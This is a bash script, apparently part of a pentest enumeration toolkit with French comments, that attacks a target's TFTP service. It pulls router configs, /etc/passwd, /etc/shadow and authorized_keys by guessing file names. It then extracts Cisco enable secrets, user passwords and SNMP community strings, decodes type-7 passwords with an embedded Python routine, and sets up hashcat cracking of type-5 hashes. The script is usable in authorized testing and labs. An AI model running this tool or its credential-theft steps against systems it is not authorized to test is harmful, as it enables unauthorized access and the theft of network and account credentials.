#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — TFTP (UDP 69)         ║
# ║   Usage: ./enum_tftp.sh <TARGET>    ║
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"

require_target "$TARGET"
banner "TFTP (UDP port 69)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "tftp")

# Détecter le client TFTP disponible (une seule fois)
if command -v atftp &>/dev/null; then
    TFTP_CLIENT="atftp"
elif command -v tftp &>/dev/null; then
    TFTP_CLIENT="tftp"
else
    TFTP_CLIENT="curl"
fi
info "Client TFTP utilisé : $TFTP_CLIENT"

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — TFTP UDP scan" "$OUTDIR/nmap_tftp.txt" \
    sudo nmap -sU -p69 -sV \
    --script tftp-enum \
    -oN "$OUTDIR/nmap_tftp_raw.txt" \
    "$TARGET"

TFTP_VER=$(grep -oP 'tftp.*[\d.]+\|TFTP.*version\s+\S+' "$OUTDIR/nmap_tftp.txt" 2>/dev/null | head -1)
[[ -n "$TFTP_VER" ]] && finding "Serveur TFTP : $TFTP_VER"

# Test connectivité basique
if check_tool tftp; then
    info "Test connectivité TFTP"
    timeout 8 tftp "$TARGET" <<< "status" 2>&1 | tee "$OUTDIR/tftp_test.txt"
fi

# ─── 2. ENUM FICHIERS ───────────────────────────────────────
section "2. ÉNUMÉRATION DES FICHIERS"

# Fichiers courants sur équipements réseau
CISCO_FILES=(
    "cisco-ios.cfg"
    "running-config"
    "startup-config"
    "running.cfg"
    "startup.cfg"
    "backup.cfg"
    "config.cfg"
    "config.txt"
    "router.cfg"
    "switch.cfg"
    "network.cfg"
    "ios.cfg"
    "nvram.cfg"
    "system.cfg"
    "tftp.cfg"
)

# Fichiers courants Linux/Unix
LINUX_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hostname"
    "/etc/hosts"
    "/etc/network/interfaces"
    "/etc/ssh/sshd_config"
    "passwd"
    "shadow"
    "hosts"
    "authorized_keys"
)

# Fichiers communs (PXE, boot)
COMMON_FILES=(
    "pxelinux.cfg/default"
    "pxelinux.0"
    "vmlinuz"
    "initrd.img"
    "unattended.txt"
    "kickstart.cfg"
    "preseed.cfg"
    "autounattend.xml"
    "install.cfg"
    "grub.cfg"
    "boot.cfg"
)

download_file() {
    local fname="$1"
    local outfile="$OUTDIR/$(echo "$fname" | tr '/' '_')"

    case "$TFTP_CLIENT" in
        atftp) timeout 5 atftp --get --remote-file "$fname" \
                   --local-file "$outfile" "$TARGET" 2>/dev/null ;;
        tftp)  timeout 5 tftp "$TARGET" <<< "get $fname $outfile" 2>/dev/null ;;
        curl)  timeout 5 curl -s --tftp-no-options "tftp://${TARGET}/${fname}" \
                   -o "$outfile" 2>/dev/null ;;
    esac

    if [[ -s "$outfile" ]]; then
        success "FICHIER TROUVÉ : $fname ($(wc -c < "$outfile") bytes)"
        echo "$fname" >> "$OUTDIR/found_files.txt"
        return 0
    else
        rm -f "$outfile"
        return 1
    fi
}

> "$OUTDIR/found_files.txt"

info "Test fichiers Cisco..."
for f in "${CISCO_FILES[@]}"; do
    download_file "$f"
done

info "Test fichiers Linux/Unix..."
for f in "${LINUX_FILES[@]}"; do
    download_file "$f"
done

info "Test fichiers communs (PXE/boot)..."
for f in "${COMMON_FILES[@]}"; do
    download_file "$f"
done

# nmap tftp-enum (liste plus large)
if grep -qi "tftp-enum" "$OUTDIR/nmap_tftp.txt" 2>/dev/null; then
    FILES_FOUND=$(grep -A 50 "tftp-enum" "$OUTDIR/nmap_tftp.txt" 2>/dev/null | \
        grep -oP '^\s+\K\S+' | head -20)
    if [[ -n "$FILES_FOUND" ]]; then
        success "Fichiers détectés par nmap tftp-enum :"
        echo "$FILES_FOUND"
        # Télécharger les fichiers trouvés par nmap
        while IFS= read -r fname; do
            download_file "$fname"
        done <<< "$FILES_FOUND"
    fi
fi

FILE_COUNT=$(wc -l < "$OUTDIR/found_files.txt" 2>/dev/null || echo 0)
if [[ "$FILE_COUNT" -gt 0 ]]; then
    finding "$FILE_COUNT fichier(s) téléchargé(s) !"
    cat "$OUTDIR/found_files.txt"
else
    warn "Aucun fichier trouvé avec les noms courants"
fi

# ─── 3. ANALYSE DES CONFIGS CISCO ───────────────────────────
if ls "$OUTDIR"/*.cfg "$OUTDIR"/*.txt 2>/dev/null | head -1 | grep -q .; then
    section "3. ANALYSE CONFIGS CISCO"

    for cfg in "$OUTDIR"/*.cfg "$OUTDIR"/*.txt; do
        [[ -f "$cfg" ]] || continue

        info "Analyse de : $(basename "$cfg")"

        # Enable password
        if grep -qi "enable password\|enable secret" "$cfg" 2>/dev/null; then
            success "ENABLE PASSWORD TROUVÉ !"
            grep -i "enable password\|enable secret" "$cfg" | tee -a "$OUTDIR/cisco_creds.txt"
            finding "Enable password/secret Cisco trouvé !"
            echo "CISCO_ENABLE_PASS" >> "$OUTDIR/findings.txt"
        fi

        # Username/password
        if grep -qi "username.*password\|username.*secret" "$cfg" 2>/dev/null; then
            success "CREDENTIALS CISCO TROUVÉS !"
            grep -i "username.*password\|username.*secret" "$cfg" | \
                tee -a "$OUTDIR/cisco_creds.txt"
            finding "Credentials utilisateurs Cisco !"
            echo "CISCO_USER_CREDS" >> "$OUTDIR/findings.txt"
        fi

        # SNMP community strings
        if grep -qi "snmp-server community" "$cfg" 2>/dev/null; then
            success "SNMP COMMUNITY STRINGS TROUVÉES !"
            grep -i "snmp-server community" "$cfg" | tee -a "$OUTDIR/cisco_creds.txt"
            finding "SNMP community strings dans la config !"
            echo "SNMP_COMMUNITY_FOUND" >> "$OUTDIR/findings.txt"
        fi

        # IP addresses / network info
        grep -iP "ip address \d|interface\s+\w+" "$cfg" 2>/dev/null | \
            tee -a "$OUTDIR/cisco_network.txt"

        # VPN / crypto
        grep -i "crypto\|ipsec\|isakmp\|vpn\|tunnel" "$cfg" 2>/dev/null | \
            tee -a "$OUTDIR/cisco_vpn.txt"
    done

    # Crack passwords Cisco type 7
    if grep -qi "password 7 " "$OUTDIR/cisco_creds.txt" 2>/dev/null; then
        info "Passwords Cisco Type 7 détectés (facilement déchiffrables)"
        grep -oP "password 7 \K\S+" "$OUTDIR/cisco_creds.txt" 2>/dev/null | while read -r enc; do
            info "Password Cisco Type 7 : $enc"
            info "Déchiffrer sur : https://www.ifm.net.nz/cookbooks/passwordcracker.html"
            echo "CISCO_TYPE7_$enc" >> "$OUTDIR/findings.txt"
        done

        # Via python si disponible
        python3 -c "
import sys
xlat = [0x64,0x73,0x66,0x64,0x3b,0x6b,0x66,0x6f,0x41,0x2c,0x2e,0x69,0x79,0x65,0x77,0x72,0x6b,0x6c,0x64,0x4a,0x4b,0x44,0x48,0x53,0x55,0x42]
pass7 = sys.argv[1]
dp = ''
for i in range(2, len(pass7), 2):
    idx = int(pass7[:2]) + (i//2-1)
    dp += chr(int(pass7[i:i+2], 16) ^ xlat[idx % len(xlat)])
print('Decoded: ' + dp)
" "$(grep -oP 'password 7 \K\S+' "$OUTDIR/cisco_creds.txt" | head -1)" 2>/dev/null
    fi

    # Passwords Cisco type 5 (MD5) → hashcat
    if grep -qi "password 5\|secret 5" "$OUTDIR/cisco_creds.txt" 2>/dev/null; then
        finding "Passwords Cisco Type 5 (MD5) — crackabler avec hashcat mode 500"
        grep -oP "(password|secret) 5 \K\S+" "$OUTDIR/cisco_creds.txt" 2>/dev/null | \
            tee "$OUTDIR/cisco_md5_hashes.txt"
        info "Cracker avec : hashcat -m 500 $OUTDIR/cisco_md5_hashes.txt /usr/share/wordlists/rockyou.txt"
    fi
fi

# ─── 4. ANALYSE PASSWD/SHADOW ───────────────────────────────
PASSWD_FILE="$OUTDIR/$(echo "passwd" | tr '/' '_')"
SHADOW_FILE="$OUTDIR/$(echo "shadow" | tr '/' '_')"

if [[ -s "$PASSWD_FILE" ]] || [[ -s "$OUTDIR/_etc_passwd" ]]; then
    section "4. ANALYSE FICHIER PASSWD"

    PFILE="$PASSWD_FILE"
    [[ -s "$OUTDIR/_etc_passwd" ]] && PFILE="$OUTDIR/_etc_passwd"

    info "Utilisateurs avec shell :"
    grep -v "nologin\|false" "$PFILE" 2>/dev/null | grep ":/home/\|:/root" | \
        tee "$OUTDIR/users_with_shell.txt"

    [[ -s "$OUTDIR/users_with_shell.txt" ]] && {
        finding "Utilisateurs avec shell home trouvés !"
        echo "PASSWD_USERS" >> "$OUTDIR/findings.txt"
    }
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$TFTP_VER" ]] && info "Serveur : $TFTP_VER"

[[ -s "$OUTDIR/found_files.txt" ]] && {
    echo ""
    success "Fichiers téléchargés :"
    cat "$OUTDIR/found_files.txt"
}

[[ -s "$OUTDIR/cisco_creds.txt" ]] && {
    echo ""
    success "CREDENTIALS CISCO :"
    cat "$OUTDIR/cisco_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
